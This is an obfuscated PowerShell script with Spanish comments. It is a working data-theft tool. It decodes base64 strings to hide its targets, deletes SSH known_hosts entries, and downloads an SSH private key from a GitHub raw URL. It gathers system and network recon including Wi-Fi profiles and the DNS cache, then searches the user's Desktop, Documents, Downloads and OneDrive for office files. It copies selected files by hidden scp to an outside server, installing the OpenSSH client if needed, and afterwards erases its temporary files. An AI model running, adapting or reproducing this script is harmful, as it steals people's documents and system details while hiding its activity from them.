# ============================================================
# 
# ============================================================

function x($y) { return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($y)) }


$ErrorActionPreference = "SilentlyContinue"
$WarningPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$InformationPreference = "SilentlyContinue"
$VerbosePreference = "SilentlyContinue"


$h1 = "NC4xNzIuMjUwLjI1Mw=="
$h2 = "YXp1cmV1c2Vy"
$h3 = "MjI="
$h4 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NpYmVyc2VnbXgvbXlfc3R1ZmYvbWFpbi9lcHJ2MzMzMGZmei50bXA="
$h5 = "ZXBydjMzMzBmZnoudG1w"
$h6 = "ZXBydjMzMzBmZnpfbmV3LnRtcA=="
$h7 = "VGVtcA=="
$h8 = "a25vd25faG9zdHM="
$h9 = "LnNzaA=="
$h10 = "aXBjb25maWc="
$h11 = "bmV0c3RhdA=="
$h12 = "cm91dGU="
$h13 = "bmV0c2g="
$h14 = "c2Nw"
$h15 = "c3No"


$z1 = x $h1
$z2 = x $h2
$z3 = x $h3
$z4 = x $h4
$z5 = x $h5
$z6 = x $h6
$z7 = Join-Path $env:LOCALAPPDATA (x $h7)
$z8 = $env:USERNAME
$z9 = $env:COMPUTERNAME

# --- FUNCION LIMPIEZA ---
function w {
    param([string[]]$k)
    $m = @(
        "$z7\${z8}_${z9}_recon.txt",
        "$z7\${z8}_${z9}_network.txt",
        "$z7\${z8}_${z9}_files.txt",
        "$z7\$z5",
        "$z7\$z6"
    )
    foreach ($n in $m) {
        if (Test-Path $n) {
            if ($k -notcontains $n) {
                try {
                    Remove-Item $n -Force -ErrorAction Stop
                } catch {
                    try {
                        $o = Get-Item $n -ErrorAction SilentlyContinue
                        if ($o) {
                            $o.Attributes = 'Normal'
                            Remove-Item $n -Force -ErrorAction SilentlyContinue
                        }
                    } catch {
                        # Ignorar errores de limpieza
                    }
                }
            }
        }
    }
}

# --- FUNCION CMD SILENCIOSO ---
function q {
    param([string]$r, [int]$s = 30000)
    $t = New-Object System.Diagnostics.ProcessStartInfo
    $t.FileName = "cmd.exe"
    $t.Arguments = "/c $r"
    $t.RedirectStandardOutput = $true
    $t.RedirectStandardError = $true
    $t.UseShellExecute = $false
    $t.CreateNoWindow = $true
    $t.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $u = [System.Diagnostics.Process]::Start($t)
    $u.WaitForExit($s) | Out-Null
    if (-not $u.HasExited) { $u.Kill() | Out-Null }
    return $u.StandardOutput.ReadToEnd()
}


$v = Join-Path $env:USERPROFILE (Join-Path (x $h9) (x $h8))
if (Test-Path $v) {
    Remove-Item $v -Force -ErrorAction SilentlyContinue
}
Get-ChildItem (Join-Path $env:USERPROFILE (x $h9)) -Filter "$(x $h8)*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue


$p1 = Join-Path $z7 $z5
$p2 = Join-Path $z7 $z6

$p3 = $false
try {
    $p4 = [System.IO.File]::Open($p1, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
    $p4.Close()
    $p4.Dispose()
} catch {
    $p3 = $true
    $p1 = $p2
}

if (-not $p3) {
    try {
        Remove-Item (Join-Path $z7 $z5) -Force -ErrorAction Stop
    } catch {
        $p1 = $p2
    }
}

$p5 = $false
try {
    $p6 = New-Object System.Net.WebClient
    $p6.DownloadFile($z4, $p1)
    $p6.Dispose()
    $p5 = $true
} catch {
    $p7 = q "curl -L -o `"$p1`" $z4" -Timeout 30000
    if (Test-Path $p1) {
        $p8 = (Get-Item $p1 -ErrorAction SilentlyContinue).Length
        if ($p8 -gt 100) { $p5 = $true }
    }
}

if (-not $p5) { exit 1 }

icacls "$p1" /inheritance:r /grant:r "${env:USERNAME}:(R)" | Out-Null


$f1 = "$z7\${z8}_${z9}_recon.txt"
try {
    $f2 = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
    $f3 = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue
    $f4 = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue

    $f5 = @"
=== RECONOCIMIENTO LOCAL ===
Fecha: $(Get-Date)
Usuario: $z8
Equipo: $z9
Dominio: $env:USERDOMAIN
SO: $($f2.Caption)
Version: $($f2.Version)
Arquitectura: $env:PROCESSOR_ARCHITECTURE
Procesador: $($f3.Name)
RAM: $([math]::Round($f4.TotalPhysicalMemory / 1GB, 2)) GB
"@

    $f6 = Get-NetAdapter -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Up" } | Select-Object Name, InterfaceDescription, MacAddress, LinkSpeed
    $f5 += "`n`n=== ADAPTADORES ===`n"
    $f5 += ($f6 | Format-List | Out-String)

    $f7 = Get-NetNeighbor -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.State -eq "Reachable" } | Select-Object IPAddress, LinkLayerAddress, InterfaceAlias
    $f5 += "`n`n=== TABLA ARP ===`n"
    $f5 += ($f7 | Format-Table -AutoSize | Out-String)

    $f8 = Get-NetIPConfiguration -ErrorAction SilentlyContinue | Where-Object { $_.NetAdapter.Status -eq "Up" } | Select-Object InterfaceAlias, @{N='IPv4';E={$_.IPv4Address.IPAddress}}, @{N='Gateway';E={$_.IPv4DefaultGateway.NextHop}}
    $f5 += "`n`n=== IP ===`n"
    $f5 += ($f8 | Format-Table -AutoSize | Out-String)

    $f5 | Out-File -FilePath $f1 -Encoding UTF8
} catch {
    # Ignorar errores de recon
}


$f9 = "$z7\${z8}_${z9}_network.txt"
try {
    $f10 = @"
=== RED RAPIDA ===
Fecha: $(Get-Date)
"@

    $f10 += "`n`n=== IPCONFIG /ALL ===`n"
    $f10 += (& (x $h10) /all 2>$null | Out-String)

    $f10 += "`n`n=== NETSTAT -AN ===`n"
    $f10 += (& (x $h11) -an 2>$null | Out-String)

    $f10 += "`n`n=== ROUTE PRINT ===`n"
    $f10 += (& (x $h12) print 2>$null | Out-String)

    $f10 += "`n`n=== WIFI PROFILES ===`n"
    $f10 += (& (x $h13) wlan show profiles 2>$null | Out-String)

    $f10 += "`n`n=== TCP + PROCESOS ===`n"
    $f11 = Get-NetTCPConnection -ErrorAction SilentlyContinue | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, @{Name='Process';Expression={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}}
    $f10 += ($f11 | Format-Table -AutoSize | Out-String)

    $f10 += "`n`n=== DNS CACHE ===`n"
    $f10 += (& (x $h10) /displaydns 2>$null | Out-String)

    $f10 | Out-File -FilePath $f9 -Encoding UTF8
} catch {
    # Ignorar errores de red
}


$f12 = "$z7\${z8}_${z9}_files.txt"
try {
    $f13 = @("*.doc", "*.docx", "*.xls", "*.xlsx", "*.txt", "*.pdf")
    $f14 = @(
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Downloads",
        "$env:USERPROFILE\OneDrive",
        "$env:USERPROFILE\Pictures",
        "$env:PUBLIC\Desktop",
        "$env:PUBLIC\Documents"
    )

    $f15 = @()
    foreach ($f16 in $f14) {
        if (Test-Path $f16) {
            foreach ($f17 in $f13) {
                $f18 = Get-ChildItem -Path $f16 -Filter $f17 -Recurse -ErrorAction SilentlyContinue -File
                $f15 += $f18
            }
        }
    }

    $f19 = $f15 | Select-Object -Property FullName, Length, LastWriteTime -Unique | Sort-Object FullName

    $f20 = @"
=== ARCHIVOS ===
Fecha: $(Get-Date)
Usuario: $z8
Equipo: $z9
Total: $($f19.Count)
"@
    $f20 | Out-File -FilePath $f12 -Encoding UTF8
    $f19 | Format-Table -AutoSize | Out-File -FilePath $f12 -Append -Encoding UTF8
} catch {
    # Ignorar errores de archivos
}


$f21 = @()
$f22 = @("*.doc", "*.docx", "*.xls", "*.xlsx", "*.txt", "*.pdf")
foreach ($f23 in $f22) {
    $f24 = $f19 | Where-Object { $_.FullName -like "*$f23" } | Sort-Object Length | Select-Object -First 1
    if ($f24) {
        $f21 += $f24
        if ($f21.Count -ge 2) { break }
    }
}

if ($f21.Count -eq 0) { 
    w -k @()
    exit 1 
}

$f25 = "C:\Windows\System32\OpenSSH\$(x $h14).exe"
$f26 = "C:\Windows\System32\OpenSSH\$(x $h15).exe"

if (-not (Test-Path $f25)) {
    Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 -ErrorAction SilentlyContinue | Out-Null
    Start-Sleep -Seconds 5
}

if (-not (Test-Path $f25)) {
    w -k @()
    exit 1
}

$f27 = "/home/$z2"
$f28 = New-Object System.Diagnostics.ProcessStartInfo
$f28.FileName = $f26
$f28.Arguments = "-p $z3 -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -o ConnectTimeout=10 -i `"$p1`" ${z2}@${z1} `"mkdir -p $f27`""
$f28.RedirectStandardOutput = $true
$f28.RedirectStandardError = $true
$f28.UseShellExecute = $false
$f28.CreateNoWindow = $true
$f28.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$f29 = [System.Diagnostics.Process]::Start($f28)
$f29.WaitForExit(15000) | Out-Null
if (-not $f29.HasExited) { $f29.Kill() | Out-Null }

$f30 = @()
$f21 | ForEach-Object {
    $f31 = $_.FullName
    $f32 = "$f27/$($_.Name)"

    $f33 = New-Object System.Diagnostics.ProcessStartInfo
    $f33.FileName = $f25
    $f33.Arguments = "-P $z3 -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -o ConnectTimeout=30 -i `"$p1`" `"$f31`" ${z2}@${z1}:$f32"
    $f33.RedirectStandardOutput = $true
    $f33.RedirectStandardError = $true
    $f33.UseShellExecute = $false
    $f33.CreateNoWindow = $true
    $f33.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $f34 = [System.Diagnostics.Process]::Start($f33)
    $f34.WaitForExit(60000) | Out-Null
    if (-not $f34.HasExited) { $f34.Kill() | Out-Null }

    if ($f34.ExitCode -eq 0) {
        $f30 += $_
    }
}


$f35 = "$z7\exfil.txt"
try {
    $f36 = "$z2@$z1 port $z3"
    $f37 = @"
=== EXFILTRACION ===
Fecha: $(Get-Date)
Origen: $z8@$z9
Destino: $f36

ARCHIVOS SELECCIONADOS:
"@
    $f21 | ForEach-Object { $f37 += "`n- $($_.FullName) ($([math]::Round($_.Length/1KB, 2)) KB)" }

    $f37 += "`n`nTRANSFERIDOS: $($f30.Count)`n"
    $f30 | ForEach-Object { $f37 += "- $($_.FullName)`n" }
    $f37 += "`nCarpeta remota: $f27`n"

    $f37 | Out-File -FilePath $f35 -Encoding UTF8
} catch {
    # Ignorar errores de exfil.txt
}


w -k @($f35)